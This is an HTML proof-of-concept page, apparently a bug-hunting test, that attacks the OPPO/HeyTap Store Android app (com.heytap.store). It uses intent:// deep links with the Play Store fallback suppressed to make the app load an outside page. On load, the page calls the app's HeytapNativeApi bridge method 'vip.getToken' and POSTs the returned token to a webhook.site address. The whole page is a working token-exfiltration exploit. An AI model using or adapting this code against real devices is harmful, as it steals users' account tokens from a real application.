<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OPPO Store Bypass</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; }
        .btn { width: 100%; max-width: 350px; padding: 20px; margin: 10px 0; font-size: 16px; font-weight: bold; color: white; border: none; border-radius: 12px; cursor: pointer; }
        .v1 { background-color: #008f39; }
        .v2 { background-color: #1a1a1a; }
        #log { text-align: left; background: #fff; padding: 15px; font-family: monospace; font-size: 12px; margin-top: 20px; border: 1px solid #ddd; }
    </style>
</head>
<body>

    <h2>OPPO Store Deep Link</h2>
    <p>Target: <b>com.heytap.store</b></p>

    <button class="btn v1" onclick="launchBypass()">Attempt App Launch (No Play Store)</button>
    <button class="btn v2" onclick="launchLegacy()">Attempt Legacy Scheme</button>

    <div id="log">Status Log:<br></div>

    <script>
        const myUrl = "https://pk009900.github.io/my-oppo-test/";
        const webhook = "https://webhook.site/9ed139f6-4ad2-4394-adc8-1ba1419aa0cd";
        const pkg = "com.heytap.store";

        function log(msg) {
            document.getElementById("log").innerHTML += "> " + msg + "<br>";
        }

        function launchBypass() {
            log("Attempting launch with Play Store block...");
            // The magic is 'S.browser_fallback_url=javascript:history.back()'
            // This stops Chrome from opening the Play Store if the link fails
            const intent = `intent://www.oppo.com/index.html?url=${myUrl}#Intent;scheme=https;package=${pkg};S.browser_fallback_url=javascript:history.back();end`;
            window.location.href = intent;
        }

        function launchLegacy() {
            log("Attempting legacy custom scheme...");
            const intent = `intent://web?url=${myUrl}#Intent;scheme=heytap;package=${pkg};S.browser_fallback_url=javascript:history.back();end`;
            window.location.href = intent;
        }

        window.onload = function() {
            if (window.HeytapNativeApi) {
                log("<b style='color:green'>SUCCESS: BRIDGE DETECTED!</b>");
                window.HeytapNativeApi.invoke("vip.getToken", (data) => {
                    fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
                    log("Token exfiltrated to Webhook.");
                });
            }
        };
    </script>
</body>
</html>
